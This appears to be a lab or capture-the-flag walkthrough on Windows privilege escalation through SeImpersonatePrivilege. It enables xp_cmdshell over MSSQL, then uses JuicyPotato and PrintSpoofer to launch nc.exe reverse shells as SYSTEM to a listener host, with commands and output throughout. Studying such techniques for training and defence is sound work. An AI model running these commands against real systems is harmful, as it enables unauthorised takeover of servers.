token impersonation attacks.
Example using juicy potato.

					Scenario, we have a foothold on the mssqlsever account, this server may need access to the files shares as the connecting client. To do so this service account(mssql)
`will be granted with Impersonate a client after auth.`
					**Login to mssql with the creds.**
```
 mssqlclient.py sql_dev@10.129.43.99 -windows-auth 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2016 (SP2) (13.0.5026)
[!] Press help for extra shell commands
SQL (WINLPE-SRV01\sql_dev  dbo@master)> enable_xp_cmdshell
INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell whoami
output                          
-----------------------------   
nt service\mssql$sqlexpress01   
NULL                            
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell whoami /priv
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               
PRIVILEGES INFORMATION                                                             
----------------------                                                             
NULL                                                                               
Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
NULL                                                                               
SQL (WINLPE-SRV01\sql_dev  dbo@master)> 

```
					we found that SeImpersonatePrivilege is enabled as authenticated client.
					Now escalate using Juicy Potato.
	First setup a listener.
```
sudo nc -lnvp 8443
listening on [any] 8443 ...

```
Then run the below cmd.

	                                                           
```
SQL (WINLPE-SRV01\sql_dev  dbo@master)>  xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.0 8443 -e cmd.exe" -t *
output                                                       
----------------------------------------------------------   
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375         
......                                                       
[+] authresult 0                                             
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM   
NULL                                                         
[+] CreateProcessWithTokenW OK                               
[+] calling 0x000000000088ce08                               
NULL                                                         
SQL (WINLPE-SRV01\sql_dev  dbo@master)> 

```
Now you will have a session in the nc, use below cmd to find the flag.txt
```
type c:\Users\Administrator\Desktop\SeImpersonate\flag.txt
```

## PrintSpoofer and RoguePotato

JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access.

**Escalating Privileges using PrintSpoofer**

```
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"


nc -lnvp 8443

```